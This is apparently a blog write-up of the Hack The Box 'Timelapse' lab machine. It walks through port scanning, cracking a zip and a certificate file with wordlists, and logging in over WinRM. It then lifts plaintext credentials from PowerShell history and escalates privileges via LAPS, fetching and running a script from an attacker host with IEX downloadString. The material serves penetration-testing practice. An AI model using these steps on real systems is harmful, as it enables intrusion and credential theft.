## Enumeration
---
title: Timelapse Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

```java
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-02-07 18:36:24Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open ldapssl?
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open globalcatLDAPssl?
5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
|_Not valid before: 2021-10-25T14:05:29
|_Not valid after: 2022-10-25T14:25:29
|_ssl-date: 2023-02-07T18:37:54+00:00; +7h59m59s from scanner time.
|_ tls-alpn: 
|_ http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open mc-nmf .NET Message Framing
49667/tcp open msrpc Microsoft Windows RPC
49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49674/tcp open msrpc Microsoft Windows RPC
49695/tcp open msrpc Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
| 311: 
|_ Message signing enabled and required
| smb2-time: 
| date: 2023-02-07T18:37:16
|_ start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
```

## User Exploit

We connect via `smbclient` to the Shares and we can see a file called winrm_backup.zip, so we go to download it.

But we are asked for a password to download it, so we are going to use `john` : 
```shell
zip2john winrm_backup.zip > zip.john
john zip.john -wordlist:/usr/share/wordlists/rockyou.txt
supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx)     
Session completed. 
```

Unzipping the .zip will leave us with a pfx file, which we have to crack again using `crackpkcs12`:
```shell
crackpkcs12 -b -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx
*********************************************************
Dictionary attack - Thread 9 - Password found: thuglegacy
*********************************************************
```

And we get the key:
```shell
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
openssl openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

And as port 5985 is open, let's connect via WinRM to the victim machine
````shell
evil-winrm -i 10.129.165.115 -c cert.pem -k priv-key.pem -S
```

Once inside, let's read the history:
```PowerShell
C:\Usersers documentation> type $env:APPDATA\MicrosoftWindows\PowerShell\PsReadLine\ConsoleHost_history.txt
```

Which reports the following information:
```PowerShell
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
```

So we can get some credentials: `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`.

So we are going to use them to login again by evil-winrm

```shell
evil-winrm -i 10.129.165.115 -u svc_deploy -p ``E3R$Q62^12p7PLlC%KWaxuaV` -S
```

Once inside, let's see which group the svc_deploy user belongs to:
```powershell
net user svc_deploy 
```
And we see that we put:

```powershell
Local Group Memberships *Remote Management Use
Global Group memberships *LAPS_Readers *Domain Users
```

## Root Exploit

As we are part of LAPS_Readers, we are going to use it for privilege escalation. To do this, we download it on our local machine and pass it to the windows:
```powershell
C:\Usershell> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.46:8000/Get-LAPSPasswords.ps1')
```

And we simply execute it, and we will be able to see the credentials.

Let's see if the password is valid for the Administrator user:
```shell
crackmapexec smb 10.129.165.115 -u 'Administrator' -p 'xiTR4G}SJ!;@8965dpv}51f-'
```

And we see that it is, so we are going to connect through `evil-winrm` and we will be able to see the root flag on the desktop of the TRX user. 

